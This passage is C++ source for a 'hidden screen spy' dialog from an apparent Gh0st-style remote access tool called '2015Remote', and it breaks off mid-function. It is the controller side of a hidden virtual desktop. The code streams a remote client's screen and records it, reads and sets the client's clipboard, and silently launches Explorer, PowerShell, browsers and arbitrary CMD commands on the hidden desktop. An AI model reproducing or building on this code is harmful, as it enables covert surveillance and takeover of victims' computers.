// ScreenSpyDlg.cpp : implementation file
//

#include "stdafx.h"
#include "2015Remote.h"
#include "InputDlg.h"
#include "CTextDlg.h"
#include "HideScreenSpyDlg.h"
#include <windows.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CHideScreenSpyDlg dialog
enum {
    IDM_SET_FLUSH = 0x0010,
    IDM_CONTROL,
    IDM_SAVEDIB,		// 保存图片
    IDM_SAVEAVI_S,      // 保存录像
    IDM_GET_CLIPBOARD,	// 获取剪贴板
    IDM_SET_CLIPBOARD,	// 设置剪贴板
    IDM_SETSCERRN,		// 修改分辨率
    IDM_QUALITY60,		// 清晰度低
    IDM_QUALITY85,		// 清晰度中
    IDM_QUALITY100,		// 清晰度高

    IDM_FPS_1,
    IDM_FPS_5,
    IDM_FPS_10,
    IDM_FPS_15,
    IDM_FPS_20,
    IDM_FPS_25,
    IDM_FPS_30,
};

IMPLEMENT_DYNAMIC(CHideScreenSpyDlg, CDialog)

CHideScreenSpyDlg::CHideScreenSpyDlg(CWnd* pParent, Server* pIOCPServer, ClientContext* pContext)
    : DialogBase(CHideScreenSpyDlg::IDD, pParent, pIOCPServer, pContext, IDI_SCREENSYP)
{
    m_bIsFirst = true; // 如果是第一次打开对话框，显示提示等待信息
    m_BitmapData_Full = NULL;
    m_lpvRectBits = NULL;

    UINT	nBISize = m_ContextObject->GetBufferLength() - 1;
    m_BitmapInfor_Full = (BITMAPINFO*) new BYTE[nBISize];
    m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
    memcpy(m_BitmapInfor_Full, m_ContextObject->GetBuffer(1), nBISize);
    memcpy(m_lpbmi_rect, m_ContextObject->GetBuffer(1), nBISize);
    m_bIsCtrl = true;
    m_bIsClosed = FALSE;
    m_ClientCursorPos = {};
    m_bCursorIndex = -1;
}

CHideScreenSpyDlg::~CHideScreenSpyDlg() {
	m_bIsClosed = TRUE;
	m_iocpServer->Disconnect(m_ContextObject);
	DestroyIcon(m_hIcon);
	Sleep(200);
	if (!m_aviFile.IsEmpty()) {
		KillTimer(132);
		m_aviFile = "";
		m_aviStream.Close();
	}
	::ReleaseDC(m_hWnd, m_hFullDC);
	DeleteDC(m_hFullMemDC);
	DeleteObject(m_BitmapHandle);
	SAFE_DELETE_ARRAY(m_lpvRectBits);
	SAFE_DELETE_ARRAY(m_BitmapInfor_Full);
	SAFE_DELETE_ARRAY(m_lpbmi_rect);
	SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_ARROW));
	m_bIsCtrl = false;
}

void CHideScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CHideScreenSpyDlg, CDialog)
    ON_WM_SYSCOMMAND()
    ON_WM_SIZE()
    ON_WM_PAINT()
    ON_WM_TIMER()
    ON_WM_CLOSE()
END_MESSAGE_MAP()


/////////////////////////////////////////////////////////////////////////////
// CHideScreenSpyDlg message handlers
void CHideScreenSpyDlg::OnClose()
{
    CancelIO();
	// 等待数据处理完毕
	if (IsProcessing()) {
		ShowWindow(SW_HIDE);
		return;
	}

	CDialogBase::OnClose();
}

void CHideScreenSpyDlg::OnReceiveComplete()
{
    if (m_bIsClosed) 	return;
    switch (m_ContextObject->GetBuffer(0)[0]) {
    case TOKEN_FIRSTSCREEN: {
        m_bIsFirst = false;
        DrawFirstScreen(m_ContextObject->GetBuffer(1), m_ContextObject->GetBufferLength()-1);
    }
    break;
	case TOKEN_NEXTSCREEN: {
		DrawNextScreenDiff(m_ContextObject->GetBuffer(0), m_ContextObject->GetBufferLength());
		break;
	}
    case TOKEN_BITMAPINFO_HIDE:
        ResetScreen();
        break;
    case TOKEN_CLIPBOARD_TEXT:
        UpdateServerClipboard((char*)m_ContextObject->GetBuffer(1), m_ContextObject->GetBufferLength() - 1);
        break;
    case TOKEN_SCREEN_SIZE:
        memcpy(&m_rect, m_ContextObject->GetBuffer(0) + 1, sizeof(RECT));
        return;
    default:
        Mprintf("Unknown command: %d\n", (int)m_ContextObject->GetBuffer(0)[0]);
        return;
    }
}


bool CHideScreenSpyDlg::SaveSnapshot()
{
    CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
    CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("位图文件(*.bmp)|*.bmp|"), this);
    if (dlg.DoModal() != IDOK)
        return false;

    BITMAPFILEHEADER	hdr;
    LPBITMAPINFO		lpbi = m_BitmapInfor_Full;
    CFile	file;
    if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate)) {
        MessageBox(_T("文件保存失败:\n") + dlg.GetPathName(), "提示");
        return false;
    }
    // BITMAPINFO大小
    int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
    // Fill in the fields of the file header
    hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
    hdr.bfSize = lpbi->bmiHeader.biSizeImage + sizeof(hdr);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;
    hdr.bfOffBits = sizeof(hdr) + nbmiSize;
    // Write the file header
    file.Write(&hdr, sizeof(hdr));
    file.Write(lpbi, nbmiSize);
    // Write the DIB header and the bits
    file.Write(m_BitmapData_Full, lpbi->bmiHeader.biSizeImage);
    file.Close();
    return true;
}

BOOL CHideScreenSpyDlg::OnInitDialog()
{
    CDialog::OnInitDialog();
	CString strString;
	strString.Format("%s - 远程虚拟屏幕 %d×%d", m_IPAddress,
		m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
    SetWindowText(strString);

    // Set the icon for this dialog.  The framework does this automatically
    // when the application's main window is not a dialog
    SetIcon(m_hIcon, TRUE);			// Set big icon
    SetIcon(m_hIcon, FALSE);		// Set small icon
    SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_NO));
    CMenu* pSysMenu = GetSystemMenu(FALSE);
    if (pSysMenu != NULL) {
        pSysMenu->AppendMenu(MF_SEPARATOR);
        pSysMenu->AppendMenu(MF_STRING, IDM_SET_FLUSH, _T("刷新(&F)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("控制屏幕(&Y)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("保存快照(&S)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("保存录像(&A)"));
        pSysMenu->AppendMenu(MF_SEPARATOR);
        pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("获取剪贴板(&R)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("设置剪贴板(&L)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_SETSCERRN, _T("修复分辨率(&G)"));
        pSysMenu->AppendMenu(MF_SEPARATOR);
        pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY60, _T("清晰度低60/100"));
        pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY85, _T("清晰度中85/100"));
        pSysMenu->AppendMenu(MF_STRING, IDM_QUALITY100, _T("清晰度高100/100"));
        pSysMenu->AppendMenu(MF_SEPARATOR);

        /*
        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_1, _T("FPS-1"));
        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_5, _T("FPS-5"));
        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_10, _T("FPS-10"));
        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_15, _T("FPS-15"));
        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_20, _T("FPS-20"));
        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_25, _T("FPS-25"));
        pSysMenu->AppendMenu(MF_STRING, IDM_FPS_30, _T("FPS-30"));
        pSysMenu->AppendMenu(MF_SEPARATOR);
        */
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Explorer, _T("打开-文件管理(&B)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_run, _T("打开-运行(&H)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Powershell, _T("打开-Powershell(&N)"));

        /*
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Chrome, _T("打开-Chrome(&I)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Edge, _T("打开-Edge(&M)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Brave, _T("打开-Brave(&D)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Firefox, _T("打开-Firefox(&V)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_Iexplore, _T("打开-Iexplore(&Z)"));
        */

        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_zdy, _T("自定义CMD命令(&y)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_zdy2, _T("高级自定义命令(&O)"));
        pSysMenu->AppendMenu(MF_STRING, IDM_OPEN_close, _T("清理后台(&J)"));

        pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
    }

    // TODO: Add extra initialization here
    m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);
    ICONINFO CursorInfo;
    ::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);
	SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)m_hRemoteCursor);
    if (CursorInfo.hbmMask != NULL)
        ::DeleteObject(CursorInfo.hbmMask);
    if (CursorInfo.hbmColor != NULL)
        ::DeleteObject(CursorInfo.hbmColor);
    // 初始化窗口大小结构
    m_hFullDC = ::GetDC(m_hWnd);
    m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
    m_BitmapHandle = CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
    m_lpvRectBits = new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
    SelectObject(m_hFullMemDC, m_BitmapHandle);
    SetStretchBltMode(m_hFullDC, STRETCH_HALFTONE);
    SetStretchBltMode(m_hFullMemDC, STRETCH_HALFTONE);
    GetClientRect(&m_CRect);
    ScreenToClient(m_CRect);
    m_wZoom = ((double)m_BitmapInfor_Full->bmiHeader.biWidth) / ((double)(m_CRect.right - m_CRect.left));
    m_hZoom = ((double)m_BitmapInfor_Full->bmiHeader.biHeight) / ((double)(m_CRect.bottom - m_CRect.top));
    SetStretchBltMode(m_hFullDC, STRETCH_HALFTONE);
    BYTE	bBuff = COMMAND_NEXT;
    m_iocpServer->Send2Client(m_ContextObject, &bBuff, 1);
#ifdef _DEBUG
    // ShowWindow(SW_MINIMIZE);
#endif
    m_strTip = CString("请等待......");
    return TRUE;  // return TRUE unless you set the focus to a control
    // EXCEPTION: OCX Property Pages should return FALSE
}

void CHideScreenSpyDlg::ResetScreen()
{
    UINT	nBISize = m_ContextObject->GetBufferLength() - 1;
    if (m_BitmapInfor_Full != NULL) {
        SAFE_DELETE_ARRAY(m_BitmapInfor_Full);
        SAFE_DELETE_ARRAY(m_lpbmi_rect);
        m_BitmapInfor_Full = (BITMAPINFO*) new BYTE[nBISize];
        m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
        memcpy(m_BitmapInfor_Full, m_ContextObject->GetBuffer(1), nBISize);
        memcpy(m_lpbmi_rect, m_ContextObject->GetBuffer(1), nBISize);
        DeleteObject(m_BitmapHandle);
        m_BitmapHandle = CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
        if (m_lpvRectBits) {
            delete[] m_lpvRectBits;
            m_lpvRectBits = new BYTE[m_lpbmi_rect->bmiHeader.biSizeImage];
        }
        SelectObject(m_hFullMemDC, m_BitmapHandle);
        SetStretchBltMode(m_hFullDC, STRETCH_HALFTONE);
        SetStretchBltMode(m_hFullMemDC, STRETCH_HALFTONE);
        GetClientRect(&m_CRect);
        ScreenToClient(m_CRect);
        m_wZoom = ((double)m_BitmapInfor_Full->bmiHeader.biWidth) / ((double)(m_CRect.right - m_CRect.left));
        m_hZoom = ((double)m_BitmapInfor_Full->bmiHeader.biHeight) / ((double)(m_CRect.bottom - m_CRect.top));
    }
}

void CHideScreenSpyDlg::DrawFirstScreen(PBYTE pDeCompressionData, unsigned long	destLen)
{
    BYTE	algorithm = pDeCompressionData[0];
    LPVOID	lpFirstScreen = pDeCompressionData + 1;
    DWORD	dwFirstLength = destLen - 1;
    if (algorithm == ALGORITHM_HOME) {
        if(dwFirstLength > 0)
            JPG_BMP(m_BitmapInfor_Full->bmiHeader.biBitCount, lpFirstScreen, dwFirstLength, m_BitmapData_Full);
    } else {
		m_ContextObject->CopyBuffer(m_BitmapData_Full, m_BitmapInfor_Full->bmiHeader.biSizeImage, 1);
    }
#if _DEBUG
    DoPaint();
#else
    PostMessage(WM_PAINT);
#endif
}

void CHideScreenSpyDlg::DrawNextScreenHome(PBYTE pDeCompressionData, unsigned long	destLen)
{
    if (!destLen) return;

    // 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
    bool	bIsReDraw = false;
    int		nHeadLength =  1; // 标识[1] + 算法[1]
    LPVOID	lpNextScreen = pDeCompressionData + nHeadLength;
    DWORD	dwNextLength = destLen - nHeadLength;
    DWORD	dwNextOffset = 0;

	// 屏幕数据是否变化
	while (dwNextOffset < dwNextLength) {
		int* pinlen = (int*)((LPBYTE)lpNextScreen + dwNextOffset);

		if (JPG_BMP(m_BitmapInfor_Full->bmiHeader.biBitCount, pinlen + 1, *pinlen, m_lpvRectBits)) {
			bIsReDraw = true;
			LPRECT lpChangedRect = (LPRECT)((LPBYTE)(pinlen + 1) + *pinlen);
			int nChangedRectWidth = lpChangedRect->right - lpChangedRect->left;
			int nChangedRectHeight = lpChangedRect->bottom - lpChangedRect->top;

			m_lpbmi_rect->bmiHeader.biWidth = nChangedRectWidth;
			m_lpbmi_rect->bmiHeader.biHeight = nChangedRectHeight;
			m_lpbmi_rect->bmiHeader.biSizeImage = (((nChangedRectWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3)
				* nChangedRectHeight;

			StretchDIBits(m_hFullMemDC, lpChangedRect->left, lpChangedRect->top, nChangedRectWidth, nChangedRectHeight,
				0, 0, nChangedRectWidth, nChangedRectHeight, m_lpvRectBits, m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);

			dwNextOffset += sizeof(int) + *pinlen + sizeof(RECT);
		}
	}

    if (bIsReDraw) {
        DoPaint();
    }
}

BOOL CHideScreenSpyDlg::ParseFrame(void) {
	//该函数不是直接画到屏幕上，而是更新一下变化部分的屏幕数据然后调用
	//OnPaint画上去
	//根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标，防止鼠标闪烁
	BOOL	bChange = FALSE;
	const ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // 标识 + 算法 + 光标位置 + 光标类型索引
	ULONG	NextScreenLength = m_ContextObject->GetBufferLength() - ulHeadLength;

	POINT	OldClientCursorPos;
	memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
	memcpy(&m_ClientCursorPos, m_ContextObject->GetBuffer(2), sizeof(POINT));

	// 鼠标移动了
	if (memcmp(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0) {
		bChange = TRUE;
	}

	// 光标类型发生变化
	BYTE bOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_ContextObject->GetBYTE(2 + sizeof(POINT));
	if (bOldCursorIndex != m_bCursorIndex) {
		bChange = TRUE;
		if (m_bIsCtrl)//替换指定窗口所属类的WNDCLASSEX结构
#ifdef _WIN64
			SetClassLongPtrA(m_hWnd, GCLP_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
#else
			SetClassLongA(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
#endif
	}

	// 屏幕是否变化
	if (NextScreenLength > 0) {
		bChange = TRUE;
	}
	return bChange;
}

void CHideScreenSpyDlg::DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned long	destLen)
{
	if (!destLen) return;
	// 根据鼠标是否移动和屏幕是否变化判断是否重绘鼠标, 防止鼠标闪烁
	BYTE	algorithm = pDeCompressionData[1];
    if (algorithm == ALGORITHM_HOME) {
        return DrawNextScreenHome(pDeCompressionData + 1, destLen - 1);
    }
	bool	bIsReDraw = ParseFrame();
	bool    keyFrame = false;
	const ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE);
	LPVOID	FirstScreenData = m_BitmapData_Full;
	LPVOID	NextScreenData = m_ContextObject->GetBuffer(ulHeadLength);
	ULONG	NextScreenLength = NextScreenData ? m_ContextObject->GetBufferLength() - ulHeadLength : 0;

	LPBYTE dst = (LPBYTE)FirstScreenData, p = (LPBYTE)NextScreenData;
	if (keyFrame)
	{
		if (m_BitmapInfor_Full->bmiHeader.biSizeImage == NextScreenLength)
			memcpy(dst, p, m_BitmapInfor_Full->bmiHeader.biSizeImage);
	}
	else if (0 != NextScreenLength) {
        bIsReDraw = true;
		for (LPBYTE end = p + NextScreenLength; p < end; ) {
			ULONG ulCount = *(LPDWORD(p + sizeof(ULONG)));
			if (algorithm == ALGORITHM_GRAY) {
				LPBYTE p1 = dst + *(LPDWORD)p, p2 = p + 2 * sizeof(ULONG);
				for (int i = 0; i < ulCount; ++i, p1 += 4)
					memset(p1, *p2++, sizeof(DWORD));
			}
			else {
				memcpy(dst + *(LPDWORD)p, p + 2 * sizeof(ULONG), ulCount);
			}
			p += 2 * sizeof(ULONG) + ulCount;
		}
	}

    if (bIsReDraw)
    {
        DoPaint();
    }
}

void CHideScreenSpyDlg::OnSize(UINT nType, int cx, int cy)
{
    CDialog::OnSize(nType, cx, cy);

    // TODO: Add your message handler code here
    if (!IsWindowVisible())
        return;

    GetClientRect(&m_CRect);
    ScreenToClient(m_CRect);
    if (!m_bIsFirst) {
        m_wZoom = ((double)m_BitmapInfor_Full->bmiHeader.biWidth) / ((double)(m_CRect.right - m_CRect.left));
        m_hZoom = ((double)m_BitmapInfor_Full->bmiHeader.biHeight) / ((double)(m_CRect.bottom - m_CRect.top));
    }
}

void  CHideScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
    CMenu* pSysMenu = GetSystemMenu(FALSE);
    switch (nID) {
    case SC_MAXIMIZE:
        OnNcLButtonDblClk(HTCAPTION, NULL);
        return;
    case SC_MONITORPOWER: // 拦截显示器节电自动关闭的消息
        return;
    case SC_SCREENSAVE:   // 拦截屏幕保护启动的消息
        return;
    case IDM_SET_FLUSH: {
        BYTE	bToken = COMMAND_FLUSH_HIDE;
        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
    }
    break;
    case IDM_CONTROL: {
        m_bIsCtrl = !m_bIsCtrl;
        pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

        if (m_bIsCtrl) {
            SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)m_hRemoteCursor);
        } else
            SetClassLongPtr(m_hWnd, GCLP_HCURSOR, (LONG_PTR)LoadCursor(NULL, IDC_NO));
    }
    break;

    case IDM_SAVEDIB:
        SaveSnapshot();
        break;
    case IDM_SAVEAVI_S: {

        if (pSysMenu->GetMenuState(IDM_SAVEAVI_S, MF_BYCOMMAND) & MF_CHECKED) {
            KillTimer(132);
            pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_UNCHECKED);
            m_aviFile = "";
            m_aviStream.Close();

            return;
        }

        if (m_BitmapInfor_Full->bmiHeader.biBitCount <= 15) {
            MessageBox(_T("不支持16位及以下颜色录像!"), "提示");
            return;
        }

        CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.avi"));
        CFileDialog dlg(FALSE, _T("avi"), strFileName, OFN_OVERWRITEPROMPT, _T("Video(*.avi)|*.avi|"), this);
        if (dlg.DoModal() != IDOK)
            return;

        m_aviFile = dlg.GetPathName();

        if (!m_aviStream.Open(m_hWnd, m_aviFile, m_BitmapInfor_Full)) {
            MessageBox(_T("Create Video(*.avi) Failed:\n") + m_aviFile, "提示");
            m_aviFile = _T("");
        } else {
            ::SetTimer(m_hWnd, 132, 250, NULL);
            pSysMenu->CheckMenuItem(IDM_SAVEAVI_S, MF_CHECKED);
        }
    }
    break;
    case IDM_GET_CLIPBOARD: { // 获取剪贴板
        BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
    }
    break;
    case IDM_SET_CLIPBOARD: { // 设置剪贴板
        SendServerClipboard();
    }
    break;
    case IDM_SETSCERRN: {
        BYTE	bToken = COMMAND_SCREEN_SETSCREEN_HIDE;
        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
    }
    break;
    case IDM_QUALITY60: { // 清晰度60
        BYTE	bToken = COMMAND_COMMAND_SCREENUALITY60_HIDE;
        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
        pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY60, MF_BYCOMMAND);
    }
    break;
    case IDM_QUALITY85: { // 清晰度85
        BYTE	bToken = COMMAND_COMMAND_SCREENUALITY85_HIDE;
        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
        pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY85, MF_BYCOMMAND);
    }
    break;
    case IDM_QUALITY100: { // 清晰度100
        BYTE	bToken = COMMAND_COMMAND_SCREENUALITY100_HIDE;
        m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(bToken));
        pSysMenu->CheckMenuRadioItem(IDM_QUALITY60, IDM_QUALITY100, IDM_QUALITY100, MF_BYCOMMAND);
    }
    break;
    case IDM_FPS_1:
        pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
        break;
    case IDM_FPS_5:
    case IDM_FPS_10:
    case IDM_FPS_15:
    case IDM_FPS_20:
    case IDM_FPS_25:
    case IDM_FPS_30:
        pSysMenu->CheckMenuRadioItem(IDM_FPS_1, IDM_FPS_30, nID, MF_BYCOMMAND);
        break;
    case IDM_OPEN_Explorer: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_Explorer;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case 	IDM_OPEN_run: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_run;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case 	IDM_OPEN_Powershell: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_Powershell;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case	IDM_OPEN_Chrome: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_Chrome;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case	IDM_OPEN_Edge: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_Edge;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case	IDM_OPEN_Brave: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_Brave;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case	IDM_OPEN_Firefox: {
        BYTE bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_Firefox;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case	IDM_OPEN_Iexplore: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_Iexplore;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case IDM_OPEN_ADD_1: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_ADD_1;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case 	IDM_OPEN_ADD_2: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_ADD_2;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case 	IDM_OPEN_ADD_3: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_ADD_3;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case 	IDM_OPEN_ADD_4: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_ADD_4;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case	IDM_OPEN_zdy: {
        EnableWindow(FALSE);

        CInputDialog	dlg(this);
        dlg.Init(_T("自定义"), _T("请输入CMD命令:"));

        if (dlg.DoModal() == IDOK && dlg.m_str.GetLength()) {
            int		nPacketLength = dlg.m_str.GetLength()*sizeof(TCHAR) + 3;
            LPBYTE	lpPacket = new BYTE[nPacketLength];
            lpPacket[0] = COMMAND_HIDE_USER;
            lpPacket[1] = IDM_OPEN_zdy;
            memcpy(lpPacket + 2, dlg.m_str.GetBuffer(0), nPacketLength - 2);
            m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
            delete[] lpPacket;

        }
        EnableWindow(TRUE);
    }
    break;
    case IDM_OPEN_zdy2: {
        EnableWindow(FALSE);
        CTextDlg	dlg(this);
        if (dlg.DoModal() == IDOK) {
            ZdyCmd m_ZdyCmd = {};
            _stprintf_s(m_ZdyCmd.oldpath, MAX_PATH,_T("%s"), dlg.oldstr.GetBuffer());
            _stprintf_s(m_ZdyCmd.newpath, MAX_PATH, _T("%s"), dlg.nowstr.GetBuffer());
            CString m_str = _T("\"");
            m_str += _T("\"");
            m_str += _T(" ");
            m_str += _T("\"");
            m_str += dlg.cmeline;
            m_str += _T("\"");
            _stprintf_s(m_ZdyCmd.cmdline, MAX_PATH, _T("%s"), m_str.GetBuffer());
            int		nPacketLength = sizeof(ZdyCmd) + 2;
            LPBYTE	lpPacket = new BYTE[nPacketLength];
            lpPacket[0] = COMMAND_HIDE_USER;
            lpPacket[1] = IDM_OPEN_zdy2;
            memcpy(lpPacket + 2, &m_ZdyCmd, nPacketLength - 2);
            m_iocpServer->Send2Client(m_ContextObject, lpPacket, nPacketLength);
            delete[] lpPacket;
        }
        EnableWindow(TRUE);
    }
    break;
    case 	IDM_OPEN_360JS: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_360JS;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
        break;
    }
    case 	IDM_OPEN_360AQ: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_360AQ;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
    }
    break;
    case 	IDM_OPEN_360AQ2: {
        BYTE	bToken[2];
        bToken[0] = COMMAND_HIDE_USER;
        bToken[1] = IDM_OPEN_360AQ2;
        m_iocpServer->Send2Client(m_ContextObject, bToken, 2);
        break;
    }
    case	IDM_OPEN_close: {
        LPBYTE	lpPacket = new BYTE;
        lpPacket[0] = COMMAND_HIDE_CLEAR;
        m_iocpServer->Send2Client(m_ContextObject, lpPacket, 1);
        delete lpPacket;
    }
    break;
    default:
        CDialog::OnSysCommand(nID, lParam);
    }
}

void CHideScreenSpyDlg::DrawTipString(CString str)
{
    RECT rect;
    GetClientRect(&rect);
    COLORREF bgcol = RGB(0x00, 0x00, 0x00);
    COLORREF oldbgcol = SetBkColor(m_hFullDC, bgcol);
    COLORREF oldtxtcol = SetTextColor(m_hFullDC, RGB(0xff, 0x00, 0x00));
    ExtTextOut(m_hFullDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

    DrawText(m_hFullDC, str, -1, &rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);

    SetBkColor(m_hFullDC, oldbgcol);
    SetTextColor(m_hFullDC, oldtxtcol);
}


BOOL CHideScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
    if (m_bIsClosed)
        return CDialog::PreTranslateMessage(pMsg);
    switch (pMsg->message) {
    case WM_ERASEBKGND:
        return TRUE;
    case WM_LBUTTONDOWN: case WM_LBUTTONUP: // 左键按下
    case WM_RBUTTONDOWN: case WM_RBUTTONUP: // 右键按下
    case WM_MBUTTONDOWN: case WM_MBUTTONUP: // 中键按下
    case WM_LBUTTONDBLCLK: case WM_RBUTTONDBLCLK: case WM_MBUTTONDBLCLK: // 双击
    case WM_MOUSEMOVE: case WM_MOUSEWHEEL:  // 鼠标移动
    {
